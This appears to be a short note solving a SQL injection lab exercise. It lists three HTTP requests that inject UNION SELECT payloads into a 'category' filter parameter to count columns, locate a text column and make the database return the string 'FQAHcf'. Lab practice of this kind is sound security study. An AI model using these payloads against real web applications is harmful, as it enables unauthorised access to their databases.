/*

Make the database retrieve the string: 'FQAHcf'

1) GET /filter?category='+UNION+SELECT+NULL,NULL,NULL-- HTTP/2
//3 columns

2) GET /filter?category='+UNION+SELECT+NULL,'a',NULL-- HTTP/2
//2nd column is string

3) GET /filter?category='+UNION+SELECT+NULL,'FQAHcf',NULL-- HTTP/2

*/